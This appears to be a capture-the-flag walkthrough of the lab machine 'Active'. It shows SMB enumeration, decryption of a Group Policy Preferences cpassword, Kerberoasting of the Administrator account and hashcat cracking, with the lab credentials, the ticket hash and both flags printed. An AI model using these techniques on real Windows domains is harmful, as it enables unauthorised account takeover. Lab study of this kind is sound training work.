# User

smb enum
```
[+] IP: 10.129.38.248:445	Name: active.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
```

Replication share is open - Anonymous access

`\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\`
```
  Groups.xml                          A      533  Wed Jul 18 22:46:06 2018
	└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

using `gpp-decrypt`
```
└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

GPPstillStandingStrong2k18
```

active.htb\SVC_TGS


`smbclient -U SVC_TGS //10.129.38.248/Users`
```
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 17:14:42 2018
  ..                                  D        0  Sat Jul 21 17:14:42 2018
  user.txt                           AR       34  Tue May 19 16:17:40 2026
```
`a8e03c87245c999d041612e8096ac0de`

# Root
HINT: `Which service account on Active is vulnerable to Kerberoasting?`

`nxc ldap 10.129.38.248 -u SVC_TGS -p GPPstillStandingStrong2k18 --kerberoasting kerb.hashes`
```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$0fdacc436b2f39563e6f7f7a2bbb4fed$c29cba2394ebaf281fe7c87604308561e2b6eaa02880980cf2af4f58660e93017bb33b1eb53898912a0479563a2088d95d5ca117da6204689428e63f4d2c142c5853aacda44bd29106278726f16b12bdbe6196d2b8d8ffef606ebf894cc76f5a581754abeca03bc3a1b634322af71411329dc578c13c36ee7adc6430065143f9afd9c5fd706a8dd9929ac107c5811054cb0368b2bb112783c19425996b456ac858a82c9b233b094cc702cdcf26ed54898aacf8f37467a2c7873d8dfcbbbbf5079160271721c845bf87110bc81458230264008d892d3288be2de8dcf48e316a29e87294a73c8c8ff314cdd0bc5e817907a046f8ace83afd2950b817a08480ef7334ac189f5c03691ca9e5201726ff2ccc9860caad53c0661b261a919a75cd3ea8bff82bf82afb416edff61ae826658eb9b61f52ed9c7f9f4e81b0f0502ef97f7ee639211f183b0c666b186f9c9399f858c4dcaa3b0cf6dd34e3a9bb5c67f6a8e60e965e7faa8d60d7d05c748ea90440aa652fc4d0614e083bee2dc1640a3e274a0aa5346d8fb478a95eaf4080d49260039724221f214bc3b5d7fda7d0cc03915e9e3317379a9e95758b211ddbf72aa91c120c661c673e429d8711dca8b95913ca76ab4489ff41cb62ccfe5902536a1c5cd6a5afe08b880193f5b0596166430228a2ec860587013da4563c7808358726dd54a65db81dd81cea55d96711ede92a3ffe04f0abde5da54e3f4bb9a2314466a111bd50190263f1357edb3c1bc072e1bb3afc095f220b6c67c879287d05850283dc3ac03419256e5232dd3e17785da39b60232b905cbd0adcf0f725037e8873925b3241fc1dcf40558b125c018a5f82bd1baae685dafa487f40879ca9b1d78f753f42f4eb3fe2ca7818aa57bf909504e8418b313248008a21d6474ced72e268e103eb07eba20aa9b2195a0207a1a17cb132b4da0536401cd261a50c763757c411e9973942b09712023380b25ce5cf0ad4a22916a91f96c0e646ddf00ed68f19fa2c10928995af2575b913964dad2ce70c6232efb76efa3794fee51c8485ffb41d22032cca587ee24521f2312d6a55ab1edd28958dece4e9b564d4ef64f92a496b16c555828ff79ae2e678aceaf76164837fb41a3117b0b8a174b32c74bb4111265346df8dcd396fa4c9d64ea3dbecff95178bf628fc2460e8a63d92a80f288b2ba16a54d76aed74a663994e4e40e0461458b85f3c83e156fdd07bb49d38c6c7ddc2d79cfe90fca4521891
```

`hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt`
Plaintext password: Ticketmaster1968

`smbclient -U Administrator //10.129.38.248/Users`

root.txt
`99dc77e94f29c6b12d20e518b57afaca`
